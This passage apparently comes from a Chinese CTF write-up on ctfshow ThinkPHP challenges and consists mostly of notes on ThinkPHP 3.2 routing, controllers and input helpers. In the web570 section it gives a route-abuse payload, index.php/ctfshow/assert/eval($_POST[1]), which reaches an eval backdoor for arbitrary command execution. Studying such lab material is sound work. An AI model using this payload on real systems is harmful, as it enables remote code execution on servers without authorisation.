<span class="token string single-quoted-string">'URL_ROUTER_ON'</span>   <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>配置路由规则：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_ROUTE_RULES'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'news/:year/:month/:day'</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'News/archive'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'status=1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'news/:id'</span>               <span class="token operator">=></span> <span class="token string single-quoted-string">'News/read'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'news/read/:id'</span>          <span class="token operator">=></span> <span class="token string single-quoted-string">'/news/:1'</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="路由定义"><a href="#路由定义" class="headerlink" title="路由定义"></a>路由定义</h3><p><code>&#39;路由表达式&#39;=&gt;&#39;路由地址和传入参数&#39;</code>或<code>array(&#39;路由表达式&#39;,&#39;路由地址&#39;,&#39;传入参数&#39;)</code></p>
<ul>
<li><p>路由表达式：</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>正则表达式</td>
<td>&#x2F;^blog&#x2F;(\d+)$&#x2F;</td>
</tr>
<tr>
<td>规则表达式</td>
<td>blog&#x2F;:id</td>
</tr>
</tbody></table>
</li>
<li><p>路由地址：</p>
<table>
<thead>
<tr>
<th>定义方式</th>
<th>定义格式</th>
</tr>
</thead>
<tbody><tr>
<td>方式1：路由到内部地址（字符串）</td>
<td>‘[控制器&#x2F;操作]?额外参数1&#x3D;值1&amp;额外参数2&#x3D;值2…’</td>
</tr>
<tr>
<td>方式2：路由到内部地址（数组）参数采用字符串方式</td>
<td>array(‘[控制器&#x2F;操作]’,’额外参数1&#x3D;值1&amp;额外参数2&#x3D;值2…’)</td>
</tr>
<tr>
<td>方式3：路由到内部地址（数组）参数采用数组方式</td>
<td>array(‘[控制器&#x2F;操作]’,array(‘额外参数1’&#x3D;&gt;’值1’,’额外参数2’&#x3D;&gt;’值2’…)[,路由参数])</td>
</tr>
<tr>
<td>方式4：路由到外部地址（字符串）301重定向</td>
<td>‘外部地址’</td>
</tr>
<tr>
<td>方式5：路由到外部地址（数组）可以指定重定向代码</td>
<td>array(‘外部地址’,’重定向代码’[,路由参数])</td>
</tr>
<tr>
<td>方式6：闭包函数</td>
<td>function($name){ echo ‘Hello,’.$name;}</td>
</tr>
</tbody></table>
<p>如果定义的是全局路由（在公共模块的配置文件中定义），那么路由地址的定义格式中需要增加模块名，如：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'blog/:id'</span><span class="token operator">=></span><span class="token string single-quoted-string">'Home/blog/read'</span> <span class="token comment">// 表示路由到Home模块的blog控制器的read操作方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果路由地址以“&#x2F;”或者“http”开头则会认为是一个重定向地址或者外部地址</p>
</li>
<li><p>路由参数：</p>
<p>限制URL后缀：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'blog/:id'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'blog/read'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'status=1&amp;app_id=5'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ext'</span><span class="token operator">=></span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>	<span class="token comment">// 限制了html后缀访问该路由规则生效</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>限制请求类型：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'blog/:id'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'blog/read'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'status=1&amp;app_id=5'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'method'</span><span class="token operator">=></span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>	<span class="token comment">// 限制了只有GET请求</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>自定义检测：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'blog/:id'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'blog/read'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'status=1&amp;app_id=5'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'callback'</span><span class="token operator">=></span><span class="token string single-quoted-string">'checkFun'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>	<span class="token comment">// 自定义checkFun函数来检测是否生效，如果函数返回false则表示不生效</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h3 id="规则路由、正则路由、静态路由"><a href="#规则路由、正则路由、静态路由" class="headerlink" title="规则路由、正则路由、静态路由"></a>规则路由、正则路由、静态路由</h3><p>这个建议直接看文档</p>
<h3 id="闭包支持"><a href="#闭包支持" class="headerlink" title="闭包支持"></a>闭包支持</h3><blockquote>
<p>可以使用闭包的方式定义一些特殊需求的路由，而不需要执行控制器的操作方法</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_ROUTE_RULES'</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'test'</span>        <span class="token operator">=></span> 
        <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'just test'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'hello/:name'</span> <span class="token operator">=></span> 
        <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hello,'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token string single-quoted-string">'blog/:year/:month'</span> <span class="token operator">=></span> 
    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$year</span><span class="token punctuation">,</span><span class="token variable">$month</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'year='</span><span class="token operator">.</span><span class="token variable">$year</span><span class="token operator">.</span><span class="token string single-quoted-string">'&amp;month='</span><span class="token operator">.</span><span class="token variable">$month</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token string single-quoted-string">'/^new\/(\d&#123;4&#125;)\/(\d&#123;2&#125;)$/'</span> <span class="token operator">=></span> 
    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$year</span><span class="token punctuation">,</span><span class="token variable">$month</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'year='</span><span class="token operator">.</span><span class="token variable">$year</span><span class="token operator">.</span><span class="token string single-quoted-string">'&amp;month='</span><span class="token operator">.</span><span class="token variable">$month</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>参数传递：</p>
<p>规则路由下访问<code>http://serverName/Home/hello/thinkphp</code>则输出<code>Hello,thinkphp</code>，对应第二个路由规则</p>
<p>正则路由下访问<code>http://serverName/Home/new/2013/03</code>则输出<code>year=2013&amp;month=03</code>，对应第四个路由规则</p>
</li>
<li><p>继续执行：</p>
<p>默认的情况下，使用闭包定义路由的话，一旦匹配到路由规则，执行完闭包方法之后，就会中止后续执行。</p>
<p>如果希望闭包函数执行后，后续的程序继续执行，可以在闭包函数中使用布尔类型的返回值，例如：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'hello/:name'</span> <span class="token operator">=></span> 
    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hello,'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span>
        <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PATH_INFO'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'blog/read/name/'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>	<span class="token comment">// 重新设置了$_SERVER['PATH_INFO']变量，交给后续的程序继续执行</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>	<span class="token comment">// 返回值是false，所以会继续执行控制器和操作的检测</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>假设blog控制器中的read操作方法代码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'read,'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'!&lt;br/>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>访问<code>http://serverName/Home/hello/thinkphp</code>，则输出</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Hello,thinkphp
read,thinkphp!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ul>
<hr>
<h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>给了我们Application的附件</p>
<p>我们解压下来审计一下</p>
<p>先全局搜索一下URL_ROUTER_ON，在Common&#x2F;Conf&#x2F;config.php</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231221003302749.png" alt="image-20231221003302749"></p>
<p>我们可以知道这里的路由规则是访问<code>ctfshow</code>路由，后面的两个参数会作为<code>call_user_func</code>函数的参数进行命令执行</p>
<p>那么我们可以直接调用system函数命令执行</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231221003908235.png" alt="image-20231221003908235"></p>
<p>此时就有一个问题了，我们在路由里构造不出<code>/</code>，所以我们直接用<code>assert</code>回调后门</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">index<span class="token operator">.</span>php<span class="token operator">/</span>ctfshow<span class="token operator">/</span>assert<span class="token operator">/</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后post请求里传入参数1进行任意命令执行</p>
<hr>
<h1 id="web571（控制器）"><a href="#web571（控制器）" class="headerlink" title="web571（控制器）"></a>web571（控制器）</h1><p>版本3.2.3</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">hello,黑客建立了控制器后门，你能找到吗<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>了解一下控制器：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1712">https://www.kancloud.cn/manual/thinkphp/1712</a></p>
<h2 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h2><blockquote>
<p>ThinkPHP的控制器是一个类，而操作则是控制器类的一个<strong>公共方法</strong></p>
</blockquote>
<p>demo：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hello,thinkphp!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>Home\IndexController</code>类就代表了Home模块下的Index控制器，而hello操作就是<code>Home\IndexController</code>类的hello（公共）方法</p>
<p>所以访问<code>http://serverName/index.php/Home/Index/hello</code>，会输出<code>hello,thinkphp!</code></p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>必须是公共方法，尽量避免和系统的保留方法相冲突</p>
<p>保留方法：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">display
get
show
fetch
theme
assign
error
success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>设置操作方法的后缀：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'ACTION_SUFFIX'</span>         <span class="token operator">=></span>  <span class="token string single-quoted-string">'Action'</span><span class="token punctuation">,</span> <span class="token comment">// 操作方法后缀</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样控制器的操作方法定义就为</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">listAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'list'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">helloAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hello'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">testAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注：后缀设置只是影响控制器类的定义，对URL访问没有影响</p>
<h3 id="前置后置操作"><a href="#前置后置操作" class="headerlink" title="前置后置操作"></a>前置后置操作</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//前置操作方法</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_before_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'before&lt;br/>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'index&lt;br/>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//后置操作方法</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_after_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'after&lt;br/>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>访问<code>http://serverName/index.php/Home/Index/index</code>，则输出</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">before
index
after<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>注：</p>
<ol>
<li>如果当前的操作并没有定义操作方法，而是直接渲染模板文件，那么如果定义了前置和后置方法的话，依然会生效。真正有模板输出的可能仅仅是当前的操作，前置和后置操作一般情况是没有任何输出的。</li>
<li>需要注意的是，在有些方法里面使用了exit或者错误输出之类的话 有可能不会再执行后置方法了。例如，如果在当前操作里面调用了控制器类的error方法，那么将不会再执行后置操作，但是不影响success方法的后置方法执行。</li>
</ol>
<h3 id="Action参数绑定"><a href="#Action参数绑定" class="headerlink" title="Action参数绑定"></a>Action参数绑定</h3><blockquote>
<p>通过直接绑定URL地址中的变量作为操作方法的参数，可以简化方法的定义甚至路由的解析</p>
</blockquote>
<p>配置：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_PARAMS_BIND'</span>       <span class="token operator">=></span>  <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// URL变量绑定到操作方法作为参数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><p>按变量名绑定（默认）：</p>
<p>demo：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">BlogController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'id='</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">archive</span><span class="token punctuation">(</span><span class="token variable">$year</span><span class="token operator">=</span><span class="token string single-quoted-string">'2013'</span><span class="token punctuation">,</span><span class="token variable">$month</span><span class="token operator">=</span><span class="token string single-quoted-string">'01'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'year='</span><span class="token operator">.</span><span class="token variable">$year</span><span class="token operator">.</span><span class="token string single-quoted-string">'&amp;month='</span><span class="token operator">.</span><span class="token variable">$month</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>url访问：</p>
<p><code>http://serverName/index.php/Home/Blog/read/id/5</code>，输出<code>id=5</code></p>
<p><code>http://serverName/index.php/Home/Blog/archive/year/2013/month/11</code>，输出<code>year=2013&amp;month=11</code></p>
<p>注：按照变量名进行参数绑定的参数必须和URL中传入的变量名称一致，但是参数顺序不需要一致</p>
<p>以下访问url等价</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php?s=/Home/Blog/archive/year/2013/month/11</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php?s=/Home/Blog/archive/month/11/year/2013</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php?c=Blog&amp;a=archive&amp;year=2013&amp;month=11</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如果直接访问<code>http://serverName/index.php/Home/Blog/read/</code>没加id参数且id参数没有默认值的话会报错</p>
</li>
<li><p>按变量顺序绑定：（仅对PATHINFO地址有效）</p>
<p>配置：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_PARAMS_BIND_TYPE'</span>  <span class="token operator">=></span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">// 设置参数绑定按照变量顺序绑定</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问地址变为：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php/Home/Blog/read/5</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php/Home/Blog/archive/2013/11</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>输出和上面一样</p>
<p>但是如果改成<code>http://serverName/index.php/Home/Blog/archive/11/2013</code>，此时输出就会变成<code>year=11&amp;month=2013</code></p>
</li>
</ul>
<h3 id="其它配置"><a href="#其它配置" class="headerlink" title="其它配置"></a>其它配置</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_HTML_SUFFIX'</span><span class="token operator">=></span><span class="token string single-quoted-string">'shtml'</span>	<span class="token comment">// 设置伪静态后缀</span>
<span class="token string single-quoted-string">'URL_CASE_INSENSITIVE'</span> <span class="token operator">=></span><span class="token constant boolean">true</span>	<span class="token comment">// URL访问不区分大小写</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="内置方法"><a href="#内置方法" class="headerlink" title="内置方法"></a>内置方法</h3><ul>
<li><p>U：动态的根据当前的URL设置生成对应的URL地址，确保项目在移植过程中不受环境的影响</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">U</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'地址表达式'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'参数'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'伪静态后缀'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'显示域名'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token function">U</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'User/add'</span><span class="token punctuation">)</span> <span class="token comment">// 生成User控制器的add操作的URL地址</span>
<span class="token function">U</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Blog/read?id=1'</span><span class="token punctuation">)</span> <span class="token comment">// 生成Blog控制器的read操作 并且id为1的URL地址</span>
<span class="token function">U</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Admin/User/select'</span><span class="token punctuation">)</span> <span class="token comment">// 生成Admin模块的User控制器的select操作的URL地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>I：获取系统输入变量</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'变量类型.变量名/修饰符'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'默认值'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'过滤方法或正则'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'额外数据源'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get.id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 相当于 $_GET['id']</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get.id'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 如果不存在$_GET['id'] 则返回0</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get.name'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htmlspecialchars'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 采用htmlspecialchars方法对$_GET['name'] 进行过滤，如果不存在则返回空字符串</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取整个$_GET 数组</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'post.name'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htmlspecialchars'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 采用htmlspecialchars方法对$_POST['name'] 进行过滤，如果不存在则返回空字符串</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.user_id'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取$_SESSION['user_id'] 如果不存在则默认为0</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cookie.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取整个 $_COOKIE 数组</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'server.REQUEST_METHOD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取 $_SERVER['REQUEST_METHOD'] </span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'param.id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 自动判断当前请求类型</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'path.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取URL参数（必须是PATHINFO模式），对http://serverName/index.php/New/2013/06/01，会输出2013</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data.file1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 获取不支持的变量类型的读取</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h3 id="变量过滤"><a href="#变量过滤" class="headerlink" title="变量过滤"></a>变量过滤</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 系统默认的变量过滤机制，也就说，I方法的所有获取变量如果没有设置过滤方法的话都会进行htmlspecialchars过滤</span>
